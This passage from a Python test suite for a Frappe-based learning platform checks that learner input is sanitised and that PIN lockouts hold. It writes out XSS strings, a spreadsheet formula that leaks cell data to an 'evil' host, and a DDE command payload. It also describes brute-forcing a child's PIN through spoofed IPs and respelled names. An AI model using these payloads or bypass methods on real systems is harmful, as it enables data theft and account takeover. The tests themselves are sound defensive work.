		mine, mtok = self._mk_student("R2Ing Mine Girl")
		first = api.submit_attempt(student=peer, token=ptok, track="t", lesson="l1",
		                           activity="word", client_id="r2ing-peer-1")
		self.assertTrue(first.get("ok"), first)
		r = api.submit_attempt(student=mine, token=mtok, track="t", lesson="l1",
		                       activity="word", client_id=["like", "%"])
		self.assertTrue(r.get("ok"), r)
		self.assertFalse(r.get("dedup"), r)
		self.assertNotEqual(r.get("name"), first["name"])
		self.assertEqual(frappe.db.get_value("Lesson Attempt", r["name"], "student"), mine)

	def test_report_doubt_keeps_her_question_and_defuses_the_bell(self):
		stu, tok = self._mk_student("R2Ing Doubt Girl")
		q = self.CONJ + " " + self.FINAL + " " + self.XSS + " मदद"
		r = api.report_doubt(student=stu, token=tok, track=self.XSS, lesson="l1",
		                     activity="quiz", question=q, lang="hi", client_id="r2ing-d1")
		self.assertTrue(r.get("ok"), r)
		row = frappe.db.get_value("Lesson Doubt", r["name"],
		                          ["track", "question"], as_dict=True)
		self._inert(row.track, row.question)
		self.assertIn(self.CONJ, row.question)          # her spelling is intact
		self.assertIn(self.FINAL, row.question)
		# the same text is copied into every facilitator's Desk bell (Notification Log.subject)
		subj = frappe.get_all("Notification Log",
		                      filters={"document_type": "Lesson Doubt", "document_name": r["name"]},
		                      pluck="subject")
		self._inert(*subj)

	def test_log_event_normalises_every_learner_string(self):
		"""question/chosen/answer are the literal text of a quiz option she tapped, and every
		column here is displayed by the Wrong Answers / Student Engagement reports."""
		stu, tok = self._mk_student("R2Ing Event Girl")
		r = api.log_event(student=stu, token=tok, kind="wrong_answer", track=self.XSS,
		                  lesson=self.XSS, activity=self.XSS, question=self.XSS,
		                  chosen=self.XSS, answer=self.CONJ + self.XSS, tool=self.XSS,
		                  lang=self.XSS, client_id="r2ing-e1")
		self.assertTrue(r.get("ok"), r)
		row = frappe.db.get_value("Learning Event", r["name"],
		                          ["track", "lesson", "activity", "question", "chosen",
		                           "answer", "tool", "lang"], as_dict=True)
		self._inert(*row.values())
		self.assertIn(self.CONJ, row.answer)
		self.assertTrue(len(row.lang) <= 10)

	def test_submit_test_and_attendance_normalise_their_strings(self):
		stu, tok = self._mk_student("R2Ing Test Girl")
		r = api.submit_test(student=stu, token=tok, track=self.XSS, status="exited",
		                    exit_reason=self.XSS, score=4, total=5, lang=self.XSS,
		                    client_id="r2ing-t1")
		self.assertTrue(r.get("ok"), r)
		row = frappe.db.get_value("Test Attempt", r["name"],
		                          ["track", "exit_reason", "lang", "score"], as_dict=True)
		self._inert(row.track, row.exit_reason, row.lang)
		self.assertEqual(row.score, 0)                  # Exited still voids the paper
		r = api.log_attendance(student=stu, token=tok, date=frappe.utils.nowdate(), secs=60,
		                       device_id=self.XSS, client_id="r2ing-p1")
		self.assertTrue(r.get("ok"), r)
		self._inert(frappe.db.get_value("Attendance Ping", {"client_id": "r2ing-p1"}, "device_id"))

	# --------------------------------------------------------- the display name
	def test_a_formula_display_name_never_reaches_the_roster(self):
		"""A self-registered name is denormalised onto every row a facilitator sees and is
		exported to XLSX. Proven: a plain guest registered =HYPERLINK(…) and it became a live
		formula cell. Neutralised (not refused) so a girl is never stuck retyping a name the
		game can only reject with one generic message."""
		api._rate_reset("signup:" + api._client_ip())   # a suite re-run must not trip the ceiling
		made = []

		def _rm():
			for n in made:
				frappe.db.delete("Student", {"name": n})
			frappe.db.commit()

		self.addCleanup(_rm)
		r = api.signup_student(name=self.FORMULA, pin="4321")
		if r.get("ok"):
			made.append(r["id"])
			stored = frappe.db.get_value("Student", r["id"], "student_name")
			self.assertNotIn(stored[:1], ("=", "+", "-", "@", "\t", "\r"), repr(stored))
			self._inert(stored)
		else:
			self.assertEqual(r.get("error"), "bad_name", r)
		for lead in ("=", "+", "-", "@"):
			r = api.signup_student(name=lead + "Asha", pin="4321")
			self.assertTrue(r.get("ok"), r)
			made.append(r["id"])
			self.assertEqual(frappe.db.get_value("Student", r["id"], "student_name"), "Asha")
		# a name made of NOTHING but leads is simply not a name
		self.assertEqual(api.signup_student(name="=+-@", pin="4321").get("error"), "bad_name")
		# …and an ordinary name is stored exactly as she typed it, joiners included
		for good in ("गुड़िया देवी",
		             "D'Souza Rani-Kumari", "Asha", "ल" + self.CONJ + "मी"):
			r = api.signup_student(name=good, pin="4321")
			self.assertTrue(r.get("ok"), r)
			made.append(r["id"])
			self.assertEqual(frappe.db.get_value("Student", r["id"], "student_name"), good,
			                 [hex(ord(c)) for c in good])

	def test_signup_online_guards_the_name_too(self):
		api._rate_reset("signup:" + api._client_ip())
		cohort = "R2Ing Online Cohort"
		if not frappe.db.exists("Cohort", cohort):
			frappe.get_doc({"doctype": "Cohort", "cohort_name": cohort, "mode": "Online",
			                "invite_code": "R2INGCODE",
			                "center": "test"}).insert(ignore_permissions=True)
		frappe.db.commit()
		user = "r2ingonline@" + api._ONLINE_EMAIL_DOMAIN

		def _rm():
			frappe.set_user("Administrator")
			frappe.db.commit()
			for s in frappe.get_all("Student", filters={"user": user}, pluck="name"):
				frappe.db.delete("Student", {"name": s})
			api._erase_student_user(user)
			if frappe.db.exists("Cohort", cohort):
				frappe.delete_doc("Cohort", cohort, force=1, ignore_permissions=True)
			frappe.db.commit()

		self.addCleanup(_rm)
		r = api.signup_online(username="r2ingonline", pin="4321", invite_code="R2INGCODE",
		                      name=self.FORMULA + self.XSS)
		self.assertTrue(r.get("ok"), r)
		stored = frappe.db.get_value("Student", r["id"], "student_name")
		self._inert(stored)
		self.assertNotIn(stored[:1], ("=", "+", "-", "@"), repr(stored))



# Reports that legitimately exist on a site WITHOUT being guarded Hikmat script
# reports. Keep this list empty of anything a facilitator can open: every entry is a
# fixture created and torn down inside a test in this file, listed by exact name so a
# real report can never be waved through by accident.
_TEST_ONLY_HIKMAT_REPORTS = frozenset((
	"RGuard Unguarded Control",   # TestReportOutputGuards positive control
	"R3 Unguarded Control",       # TestRound3ReportGuards positive control (below)
))


class TestRound3ReportGuards(FrappeTestCase):
	"""The five reports round 2 missed, plus a sweep that refuses to let a sixth hide."""

	CONVERTED = ("Hardest Questions", "Student Progress", "Confusion Heatmap",
	             "AI Review Queue", "Pending Evaluations")
	# `onerror` writes to a global so a browser harness can count executions; the string
	# only has to contain angle brackets for the assertions here.
	XSS = '<img src=x onerror="window.__fired=(window.__fired||0)+1">'
	FORMULA = '=HYPERLINK("http://evil/?"&A1,"CLICK ME")'
	DDE = "+cmd|' /C calc'!A0"
	# the export IS the Champaran Bhojpuri corpus: these bytes must survive verbatim
	DEVANAGARI = 'मैं "बोली" बोलती हूँ 🙂 — it\'s fine & good'
	LEAD = ("=", "+", "-", "@", "\t", "\r")
	TAG = "R3Guard"
	CONTROL = "R3 Unguarded Control"

	# ------------------------------------------------------------------ fixtures
	def setUp(self):
		frappe.set_user("Administrator")
		self._form = getattr(frappe.local, "form_dict", None)
		# Registered FIRST so it runs LAST (cleanups are LIFO): every fixture below has to
		# be COMMITTED to be visible to _export_query, and FrappeTestCase only rolls back
		# once per CLASS (addClassCleanup(_rollback_db)) — so an uncommitted teardown delete
		# would be undone at the end of the class and the payload rows would stay on the
		# site. Committing the deletions is what keeps a test run from leaking learner-XSS
		# fixtures into a real Desk.
		self.addCleanup(frappe.db.commit)
		self.addCleanup(self._restore_form)
		self.addCleanup(lambda: frappe.flags.pop("hikmat_report_export", None))

	def _restore_form(self):
		frappe.local.form_dict = self._form if self._form is not None else frappe._dict()

	def _mk(self, doc):
		"""Insert without validation: these rows model what the DB looked like BEFORE the
		ingest sanitiser landed, which is the population the output guard has to render
		inert. Validation would rewrite the payload and test nothing."""
		d = frappe.get_doc(doc)
		d.flags.ignore_validate = True
		d.flags.ignore_mandatory = True
		d.flags.ignore_links = True
		row = d.insert(ignore_permissions=True, ignore_links=True)
		dt, name = doc["doctype"], row.name
		self.addCleanup(lambda: frappe.db.exists(dt, name)
		                and frappe.delete_doc(dt, name, force=1, ignore_permissions=1))
		return row

	@staticmethod
	def _raw(doctype, name, **vals):
		"""Put the payload in the column BYTE-FOR-BYTE, bypassing every hook."""
		for k, v in vals.items():
			frappe.db.set_value(doctype, name, k, v, update_modified=False)

	def _seed(self):
		"""One payload row per source table of the five reports, for three girls: a
		formula+markup name, a legitimate Bhojpuri name, and a DDE name."""
		if not frappe.db.exists("Cohort Start Date", "2026-09-01"):
			self._mk({"doctype": "Cohort Start Date", "start_date": "2026-09-01"})
		coh = self.TAG + " Cohort"
		if not frappe.db.exists("Cohort", coh):
			self._mk({"doctype": "Cohort", "cohort_name": coh, "mode": "Offline",
			          "start_date": "2026-09-01", "center": "t"})
		camp = self.TAG + " Campus"
		if not frappe.db.exists("Campus", camp):
			self._mk({"doctype": "Campus", "campus_name": camp, "location": "t", "active": 1})
		mile = frappe.get_all("Hikmat Milestone", pluck="name", limit=1)
		mile = mile[0] if mile else self._mk({
			"doctype": "Hikmat Milestone", "milestone_key": self.TAG.lower(),
			"title": "R3 Belt", "threshold_gems": 10, "sort_order": 99, "active": 1}).name

		now = frappe.utils.now()
		for i, base in enumerate((self.FORMULA + self.XSS, self.DEVANAGARI, self.DDE + self.XSS)):
			pay = base + " " + self.TAG
			girl = self._mk({"doctype": "Student", "student_name": "r3 seed", "age": 13,
			                 "gender": "Female", "active": 1, "cohort": coh, "campus": camp})
			self._raw("Student", girl.name, student_name=pay)

			a = self._mk({"doctype": "Lesson Attempt", "student": girl.name,
			              "student_name": "s", "cohort": coh, "track": "t", "lesson": "l",
			              "activity": "a", "stars": 2, "score": 3, "total": 4, "coins": 5,
			              "attempted_on": now})
			self._raw("Lesson Attempt", a.name, student_name=pay, cohort=pay,
			          track=pay, lesson=pay, activity=pay)

			e = self._mk({"doctype": "Learning Event", "student": girl.name,
			              "kind": "wrong_answer", "track": "t", "lesson": "l",
			              "activity": "a", "question": "q", "chosen": "c", "answer": "ans",
			              "occurred_on": now})
			self._raw("Learning Event", e.name, question=pay, chosen=pay, answer=pay,
			          track=pay, lesson=pay, activity=pay)

			d = self._mk({"doctype": "Lesson Doubt", "student": girl.name, "track": "t",
			              "lesson": "l", "activity": "a", "question": "q", "resolved": 0,
			              "raised_on": now})
			self._raw("Lesson Doubt", d.name, track=pay, lesson=pay, activity=pay)

			# conversation_id carries a UNIQUE index, so it must be fresh on every run
			c = self._mk({"doctype": "AI Conversation", "student": girl.name,
			              "student_name": "s", "cohort": coh, "track": "t", "lesson": "l",
			              "conversation_id": self.TAG + frappe.generate_hash(length=10),
			              "flagged": 1, "flag_reason": "crisis", "reviewed": 0,
			              "started_on": now})
			self._raw("AI Conversation", c.name, student_name=pay, cohort=pay,
			          lesson=pay, flag_reason=pay)

			v = self._mk({"doctype": "Evaluation", "student": girl.name, "student_name": "s",
			              "cohort": coh, "campus": camp, "milestone": mile,
			              "threshold_gems": 10, "gems_at_reach": 20, "status": "Pending",
			              "reached_on": now})
			self._raw("Evaluation", v.name, student_name=pay, cohort=pay,
			          campus=pay, milestone=pay)
		frappe.db.commit()

	def _control(self):
		"""An UNGUARDED Query Report over the very same rows, run through the very same
		frappe.desk.query_report.run — so a green result above cannot be an artefact of
		the harness looking in the wrong place."""
		name = self.CONTROL
		if frappe.db.exists("Report", name):
			frappe.delete_doc("Report", name, force=1, ignore_permissions=1)

		# The teardown COMMITS. This row has to be committed to be readable by
		# _export_query, and FrappeTestCase's own rollback runs after our cleanups, so an
		# uncommitted delete here would be undone and would leave a genuinely unguarded
		# Query Report row on the site — which the sweep test below would then (rightly)
		# report as a finding on the NEXT run.
		def _drop():
			if frappe.db.exists("Report", name):
				frappe.delete_doc("Report", name, force=1, ignore_permissions=1)
			frappe.db.commit()

		self.addCleanup(_drop)
		# CHAR(37) is '%': a literal % would be eaten by pymysql's mogrify
		frappe.get_doc({
			"doctype": "Report", "report_name": name, "ref_doctype": "Learning Event",
			"report_type": "Query Report", "is_standard": "No", "module": "Hikmat",
			"query": ('SELECT e.question AS "Question::300", e.chosen AS "Chosen::300" '
			          "FROM `tabLearning Event` e WHERE e.kind='wrong_answer' "
			          "AND e.question LIKE CONCAT(CHAR(37),'R3Guard',CHAR(37))"),
			"roles": [{"role": "System Manager"}],
		}).insert(ignore_permissions=True)
		frappe.db.commit()
		return name

	# ------------------------------------------------------------------ helpers
	def _grid(self, report, filters=None):
		"""The REAL grid path: frappe.desk.query_report.run under a `run` request."""
		from frappe.desk.query_report import run
		frappe.local.form_dict = frappe._dict({"cmd": "frappe.desk.query_report.run"})
		return frappe._dict(run(report, filters or {}, are_default_filters=False))

	def _export(self, report, fmt="Excel"):
		"""The REAL export path: frappe.desk.query_report._export_query — what the Export
		button and the emailed background export both call."""
		from frappe.desk.query_report import _export_query
		frappe.local.form_dict = frappe._dict()      # a background job has no form_dict
		form = frappe._dict({"report_name": report, "file_format_type": fmt, "filters": {},
		                     "visible_idx": [], "include_indentation": 0,
		                     "include_filters": 0, "custom_columns": "[]",
		                     "applied_filters": None})
		_n, _e, content = _export_query(form, frappe._dict({"delimiter": ",", "quoting": 0}),
		                                populate_response=False)
		return content

	def _mine(self, report, filters=None):
		"""Every string cell of the real grid result that carries our payload, labelled."""
		res = self._grid(report, filters)
		cells = TestReportOutputGuards._strings(res.result, res.columns)
		return [(label, v) for label, v in cells if self.TAG in v]

	# ------------------------------------------------------------------ the class
	def test_the_five_reports_no_longer_store_their_sql(self):
		"""A `query` back in the DB row is the whole bug: it means the report body is SQL
		again and there is nowhere left to escape a value."""
		for name in self.CONVERTED:
			row = frappe.db.get_value("Report", name,
			                          ["report_type", "is_standard", "query", "ref_doctype"],
			                          as_dict=True)
			self.assertTrue(row, name + " is missing from this site")
			self.assertEqual(row.report_type, "Script Report", name)
			self.assertEqual(row.is_standard, "Yes", name)
			self.assertFalse(row.query, name + " still carries raw SQL in the DB row")

	def test_the_conversion_kept_the_report_a_facilitator_knew(self):
		"""The fix is invisible by contract: same ref doctype, same System Manager
		permission, same column labels in the same order, same widths. If this fails the
		facilitator notices the security fix, which is how a security fix gets reverted."""
		expected = {
			"Hardest Questions": ("Learning Event", [
				("Question", 260), ("Track", 100), ("Lesson", 100), ("Activity", 90),
				("Times Wrong", 100), ("Learners", 80), ("Most-picked Wrong", 170),
				("Correct Answer", 150), ("Last Seen", 150)]),
			"Student Progress": ("Lesson Attempt", [
				("Name", 140), ("Cohort", 130), ("Attempts", 90), ("Passed", 80),
				("Lessons", 90), ("Avg Stars", 95), ("Coins", 90), ("Last Active", 130)]),
			"Confusion Heatmap": ("Lesson Doubt", [
				("Track", 130), ("Lesson", 130), ("Activity", 120), ("Doubts", 90),
				("Learners", 90), ("Open", 80), ("Last Raised", 160)]),
			"AI Review Queue": ("AI Conversation", [
				("Conversation", 150), ("Name", 130), ("Cohort", 120), ("Lesson", 110),
				("Flagged", 70), ("Reason", 110), ("Reviewed", 80), ("When", 160)]),
			"Pending Evaluations": ("Evaluation", [
				("Evaluation", 160), ("Student", 140), ("Cohort", 120), ("Campus", 140),
				("Milestone", 110), ("Threshold", 100), ("Gems", 90), ("Reached", 160)]),
		}
		for name, (ref, cols) in expected.items():
			self.assertEqual(frappe.db.get_value("Report", name, "ref_doctype"), ref, name)
			self.assertEqual(
				sorted(frappe.get_all("Has Role", filters={"parent": name,
				                                           "parenttype": "Report"},
				                      pluck="role")),
				["System Manager"], name)
			got = self._grid(name).columns
			self.assertEqual([(c["label"], c["width"]) for c in got], cols, name)

	def test_every_learner_column_is_inert_in_the_desk_grid(self):
		"""The grid assigns innerHTML, so an angle bracket surviving in ANY Data cell is
		the vulnerability, and a leading formula char is the export bug travelling by
		copy-paste. Checked on rows written straight to the DB, i.e. pre-fix rows."""
		self._seed()
		checked = 0
		for report in self.CONVERTED:
			cells = self._mine(report)
			self.assertTrue(cells, report + ": the payload never reached the report")
			for label, v in cells:
				self.assertNotIn("<", v, f"{report}[{label}] can be parsed as markup: {v!r}")
				self.assertNotIn(">", v, f"{report}[{label}] can be parsed as markup: {v!r}")
				self.assertNotIn(v[:1], self.LEAD,
				                 f"{report}[{label}] leads with a formula char: {v!r}")
			checked += len(cells)
		# every learner-authored column of all five, three girls each
		self.assertGreaterEqual(checked, 3 * (6 + 2 + 3 + 4 + 4))

	def test_every_learner_column_is_actually_reached_by_the_guard(self):
		"""Inertness is worthless if a column simply never carried the payload: name the
		columns that MUST show up guarded, so deleting a guard_rows argument fails here
		instead of shipping."""
		self._seed()
		expected = {
			"Hardest Questions": {"Question", "Track", "Lesson", "Activity",
			                      "Most-picked Wrong", "Correct Answer"},
			"Student Progress": {"Name", "Cohort"},
			"Confusion Heatmap": {"Track", "Lesson", "Activity"},
			"AI Review Queue": {"Name", "Cohort", "Lesson", "Reason"},
			"Pending Evaluations": {"Student", "Cohort", "Campus", "Milestone"},
		}
		for report, labels in expected.items():
			seen = {label for label, _v in self._mine(report)}
			self.assertEqual(seen, labels, report)

	def test_the_harness_would_notice_an_unguarded_version(self):
		"""POSITIVE CONTROL. The same DB bytes, through the same run() and the same
		_export_query, from a report with no guard, must trip every assertion above —
		otherwise these tests only prove that reports return nothing interesting."""
		self._seed()
		name = self._control()
		res = self._grid(name)
		cells = TestReportOutputGuards._strings(res.result, res.columns)
		mine = [v for _label, v in cells if self.TAG in v]
		self.assertTrue(mine, "control returned none of the payload rows")
		self.assertTrue(any("<" in v for v in mine), "control lost the markup payload")
		self.assertTrue(any(v[:1] in self.LEAD for v in mine), "control lost the formula")
		self.assertTrue(TestReportOutputGuards._xlsx_formulas(self._export(name)),
		                "control produced no evaluable spreadsheet cell — the export "
		                "harness cannot detect formula injection")

	def test_exports_are_formula_safe_and_keep_the_bhojpuri_verbatim(self):
		"""Two properties at once, and they pull against each other: no cell may be
		evaluable, and no cell may be entity-mangled. HTML-escaping the export (the first
		attempt at this fix) turned `it's fine & good` into `it&apos;s fine &amp; good` —
		a corrupted corpus, which for this project is also a data-integrity bug."""
		self._seed()
		for report in self.CONVERTED:
			book = self._export(report)
			cells = [c for c in TestReportOutputGuards._xlsx_strings(book) if self.TAG in c]
			self.assertTrue(cells, report + ": nothing of the payload in the export")
			self.assertFalse(TestReportOutputGuards._xlsx_formulas(book),
			                 report + ": exported .xlsx still has evaluable cells")
			self.assertTrue(any(self.DEVANAGARI in c for c in cells),
			                report + ": export lost the Devanagari verbatim")
			for entity in ("&quot;", "&apos;", "&#39;", "&amp;", "&lt;", "&gt;"):
				self.assertFalse(any(entity in c and self.DEVANAGARI[:6] in c for c in cells),
				                 report + ": export entity-mangled the Devanagari")
			# and the safety must come from the GUARD, not from the value being dropped
			self.assertTrue(any(c.startswith("'=HYPERLINK") for c in cells),
			                report + ": no apostrophe-guarded =HYPERLINK cell")
			self.assertTrue(any(c.startswith("'+cmd|") for c in cells),
			                report + ": no apostrophe-guarded DDE cell")

	def test_csv_export_of_the_five_stays_readable_and_inert(self):
		"""get_csv_bytes has no formula guard of its own, and frappe's handle_html only
		un-escapes a value containing BOTH < and >, so a bare &quot; would reach the file."""
		import csv as csvmod
		import io as _io
		self._seed()
		for report in self.CONVERTED:
			blob = self._export(report, fmt="CSV").decode("utf-8")
			# parse as a spreadsheet would: RFC4180 doubles inner quotes, so comparing
			# against the raw blob would only be testing the CSV writer
			rows = list(csvmod.reader(_io.StringIO(blob)))
			fields = [f for r in rows[1:] for f in r if self.TAG in f]
			self.assertTrue(fields, report + ": no payload field in the CSV")
			self.assertTrue(any(self.DEVANAGARI in f for f in fields),
			                report + ": CSV lost the Devanagari verbatim")
			for f in fields:
				self.assertNotIn(f[:1], self.LEAD,
				                 report + ": evaluable CSV field: " + repr(f))
				for entity in ("&quot;", "&apos;", "&#39;", "&amp;"):
					self.assertNotIn(entity, f,
					                 report + ": entity-mangled CSV field: " + repr(f))

	def test_a_reseed_cannot_restore_an_unguarded_report(self):
		"""setup_analytics() runs on every fresh install and by hand after content edits.
		Before this round it rewrote five Query Reports from SQL strings, undoing any fix
		applied to the DB row. Each seeder now adopts the on-disk script report instead."""
		from hikmat import setup_data
		for setup in (setup_data.setup_hard_questions_report, setup_data.setup_student_report,
		              setup_data.setup_doubt_report, setup_data.setup_ai_report,
		              setup_data.setup_evaluation_report):
			setup()
			setup()                                   # idempotent: called twice on purpose
		for name in self.CONVERTED:
			row = frappe.db.get_value("Report", name, ["report_type", "query"], as_dict=True)
			self.assertEqual(row.report_type, "Script Report", name)
			self.assertFalse(row.query, name + " was re-seeded as raw SQL")
		# and statically: no seeder anywhere in setup_data may author a Query Report again
		# Matches the authoring pattern, not the words: prose about Query Reports is fine,
		# a dict that INSERTS one is the regression.
		src = open(frappe.get_app_path("hikmat", "setup_data.py"), encoding="utf-8").read()
		self.assertNotIn('"report_type": "Query Report"', src,
		                 "setup_data.py authors a Query Report again — a Query Report's "
		                 "body is SQL in a DB row, which has nowhere to escape a value")

	def test_patch_v11_is_registered_and_idempotent(self):
		"""A conversion that is not in patches.txt does not reach production, and a patch
		that is not idempotent cannot be re-run after a half-failed migrate."""
		patches = open(frappe.get_app_path("hikmat", "patches.txt"), encoding="utf-8").read()
		self.assertIn("hikmat.patches.v11_guard_more_reports", patches)
		from hikmat.patches import v11_guard_more_reports as v11
		self.assertEqual(set(v11.CONVERTED), set(self.CONVERTED))

		def snapshot():
			out = {}
			for n in self.CONVERTED:
				out[n] = (frappe.db.get_value(
					"Report", n, ["report_type", "is_standard", "query", "ref_doctype",
					              "module", "disabled"], as_dict=True),
					sorted(frappe.get_all("Has Role",
					                      filters={"parent": n, "parenttype": "Report"},
					                      pluck="role")))
			return out

		v11.execute()
		first = snapshot()
		v11.execute()
		self.assertEqual(first, snapshot(), "the second v11 run changed the site")
		for name, (row, roles) in first.items():
			self.assertFalse(row.query, name)
			self.assertEqual(roles, ["System Manager"], name)

	# ------------------------------------------------------------------ the sweep
	def test_no_report_anywhere_can_render_learner_text_unguarded(self):
		"""THE SWEEP — the test that is meant to make a seventh round unnecessary.

		Rounds 2 and 3 both happened because a report was *missed*, so this does not
		enumerate a list someone has to remember to extend. It walks the site's Report
		table and the app's report packages and states the two invariants:

		1. every Hikmat Report row is a STANDARD SCRIPT report with no SQL in the row
		   (a Query Report cannot escape anything, so being one is the finding), and
		2. every report package on disk imports hikmat.report_utils.

		(2) is deliberately crude — it does not prove the right columns are guarded, only
		that the guard is present at all; the per-report tests above prove the columns.
		Adding a report without a guard therefore fails HERE, in a test whose name says
		why, instead of silently in production.

		Non-Hikmat rows (frappe's own Website Analytics, ToDo, …) are out of scope: they
		neither select from a Hikmat table nor render a byte a girl typed.
		"""
		rows = frappe.get_all("Report", filters={"module": "Hikmat"},
		                      fields=["name", "report_type", "is_standard"])
		self.assertGreaterEqual(len(rows), 7, "the Hikmat reports are missing from this site")
		unguarded = []
		for r in rows:
			if r.name in _TEST_ONLY_HIKMAT_REPORTS:
				continue
			q = frappe.db.get_value("Report", r.name, "query")
			if r.report_type != "Script Report" or r.is_standard != "Yes" or q:
				unguarded.append((r.name, r.report_type, r.is_standard, bool(q)))
		self.assertFalse(unguarded,
		                 "Report rows that can emit learner text unescaped: %r" % (unguarded,))

		# on-disk packages: name -> imports the guard?
		import os as _os
		base = frappe.get_app_path("hikmat", "hikmat", "report")
		missing = []
		folders = [f for f in sorted(_os.listdir(base))
		           if _os.path.isdir(_os.path.join(base, f)) and not f.startswith("_")]
		for folder in folders:
			path = _os.path.join(base, folder, folder + ".py")
			if not _os.path.exists(path):
				missing.append((folder, "no execute() module on disk"))
				continue
			src = open(path, encoding="utf-8").read()
			if "hikmat.report_utils" not in src:
				missing.append((folder, "does not import hikmat.report_utils"))
		self.assertFalse(missing, "report packages with no output guard: %r" % (missing,))

		# and every guarded package is actually registered, so a converted report cannot
		# sit on disk while the DB keeps serving the old Query Report row. frappe resolves
		# a script report's module as report/<scrub(name)>/<scrub(name)>.py, so the folder
		# set and the scrubbed row set must match.
		self.assertTrue(folders, "no report packages found at all — wrong path?")
		registered = {frappe.scrub(r.name) for r in rows}
		self.assertTrue(set(folders) <= registered,
		                "report packages on disk with no Report row: %r"
		                % sorted(set(folders) - registered))


# ---------------------------------------------------------------------------
# Security regressions, round 3 (audit 2026-07-28, verifier pass):
#   * the PIN lockout was keyed on a SPOOFABLE IP  → account takeover (CRITICAL)
#   * the trusted-proxy model never landed          → the original spoof still live (HIGH)
#   * a DEACTIVATED girl's recordings kept circulating                        (MEDIUM)
#   * spreadsheet-formula injection was only closed at the export             (HIGH)
# The client-IP derivation table itself lives in TestRateLimitKeyAndWindow above (it is the
# same helper those tests were already built around); everything else is here.
# ---------------------------------------------------------------------------
class TestRound3LockoutOwnershipAndIngest(FrappeTestCase):
	"""Round-3 regressions. Read the PIN LOCKOUT note in api.py before changing a number
	here: the budgets are a deliberate trade-off between guessing a child's PIN and locking
	her out of her own profile, not arbitrary constants."""

	PIN = "4321"
	ZWJ = chr(0x200D)
	LEADS = ('=HYPERLINK("http://evil/?"&A1,"HI")', "+cmd|' /C calc'!A0", "@SUM(A1)",
	         "-2+3", "\tsneaky", "\rsneaky")

	# ------------------------------------------------------------------ fixtures
	def setUp(self):
		# Login failures also feed a per-SOURCE counter, keyed on the derived client IP. There
		# is no request here, so _login_ip_bucket() answers None and nothing accumulates — pin
		# that, because if it ever started keying on "unknown" a long suite run would make an
		# unrelated login answer "locked".
		self.assertIsNone(api._login_ip_bucket())

	def _reset_bucket(self, bucket):
		api._rate_reset(bucket)
		self.addCleanup(api._rate_reset, bucket)

	def _acct(self, kind, value):
		"""An account's failure buckets, reset before and after the test."""
		acct = api._login_account_key(kind, value)
		for b in api._login_buckets(acct):
			self._reset_bucket(b)
		return acct

	def _mk(self, name, pin=None, active=1):
		def _rm():
			frappe.db.commit()
			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				for dt in ("Lesson Attempt", "Test Attempt", "Lesson Doubt", "Learning Event",
				           "Attendance Ping", "Attendance Day"):
					frappe.db.delete(dt, {"student": s})
				frappe.db.delete("Student", {"name": s})
			frappe.db.commit()

		_rm()                                        # a previous crashed run must not collide
		self.addCleanup(_rm)
		doc = frappe.get_doc({"doctype": "Student", "student_name": name, "active": active,
		                      "gender": "Female",
		                      "login_pin": api._hash_pin(pin or self.PIN)}).insert(
			ignore_permissions=True)
		frappe.db.commit()
		return doc, api._token_for(doc.name)

	# =========================================================== 1. the PIN lockout
	def test_wrong_pins_from_many_spoofed_ips_still_lock_the_account(self):
		"""THE CRITICAL ONE. The lockout key was _client_ip() + name, so eight wrong PINs from
		eight spoofed X-Forwarded-For values never tripped it and a 4-digit PIN was
		brute-forceable (proven over HTTP against this bench). The key is now the account."""
		girl, _ = self._mk("R3Lock Spoof Girl")
		acct = self._acct("nm", "r3lock spoof girl")
		old = getattr(frappe.local, "request", None)
		self.addCleanup(lambda: setattr(frappe.local, "request", old))
		restore = _use_trusted_proxies(None)         # even the friendliest proxy config
		self.addCleanup(restore)
		seen = []
		for i in range(1, 11):
			# every request looks like a different client, at both layers
			frappe.local.request = _fake_request("198.51.100.%d, 127.0.0.1" % i, "127.0.0.1")
			seen.append(api.login_by_name(name="R3Lock Spoof Girl", pin="80%02d" % i).get("error"))
		self.assertEqual(seen[:api._MAX_PIN_TRIES], ["bad_login"] * api._MAX_PIN_TRIES)
		self.assertEqual(set(seen[api._MAX_PIN_TRIES:]), {"locked"}, seen)
		# and the CORRECT PIN is refused while she is locked — from yet another address
		frappe.local.request = _fake_request("203.0.113.44, 127.0.0.1", "127.0.0.1")
		self.assertEqual(api.login_by_name(name="R3Lock Spoof Girl", pin=self.PIN).get("error"),
		                 "locked")
		# the counter is ONE bucket, not one per source
		self.assertEqual(api._rate_state(api._login_buckets(acct)[0])[0], api._MAX_PIN_TRIES)
		self.assertTrue(girl.name)

	# The test ABOVE varies only the IP — which is the one attack whoever wrote the first fix
	# already had in mind. A cold reviewer then broke the "per-account" lockout in about a
	# minute by leaving the IP alone and varying the SPELLING instead: tabStudent is
	# utf8mb4_unicode_ci, so case differences and every zero-weight format character select the
	# SAME row, while a byte-exact cache key gave each spelling its own 8-try budget (proven:
	# 70 wrong PINs to one girl, never locked). The two tests below are that attack. Keep both:
	# a lockout has to be invariant under everything the DATABASE treats as the same account.
	RESPELLINGS = ("{n}", "{N}", "{l}", "{n}‍", "{n}‌", "{n}​",
	               "﻿{n}", "{n}⁠", "‎{n}", "{s}")

	def _spellings(self, name):
		return [t.format(n=name, N=name.upper(), l=name.lower(),
		                 s=name.replace(" ", "  ")) for t in self.RESPELLINGS]

	def test_respelling_her_name_does_not_buy_a_fresh_lockout_budget(self):
		"""Rotate the spelling AND the source address on every single try."""
		girl, _ = self._mk("R3Lock Respell Girl")
		acct = self._acct("nm", api._login_name_key("R3Lock Respell Girl"))
		old = getattr(frappe.local, "request", None)
		self.addCleanup(lambda: setattr(frappe.local, "request", old))
		self.addCleanup(_use_trusted_proxies(None))
		errors = []
		for i, spelling in enumerate(self._spellings("R3Lock Respell Girl"), start=1):
			frappe.local.request = _fake_request("198.51.100.%d, 127.0.0.1" % i, "127.0.0.1")
			errors.append(api.login_by_name(name=spelling, pin="70%02d" % i).get("error"))
		# every spelling authenticates against her row, so they share ONE budget
		self.assertEqual(errors[:api._MAX_PIN_TRIES], ["bad_login"] * api._MAX_PIN_TRIES)
		self.assertIn("locked", errors[api._MAX_PIN_TRIES:], errors)
		self.assertEqual(api._rate_state(api._login_buckets(acct)[0])[0], api._MAX_PIN_TRIES)
		# and the real PIN is refused while she is locked, however it is spelled
		frappe.local.request = _fake_request("203.0.113.9, 127.0.0.1", "127.0.0.1")
		self.assertEqual(api.login_by_name(name="R3LOCK  RESPELL  GIRL",
		                                   pin=self.PIN).get("error"), "locked")
		self.assertTrue(girl.name)

	def test_respelling_a_docname_does_not_buy_a_fresh_lockout_budget(self):
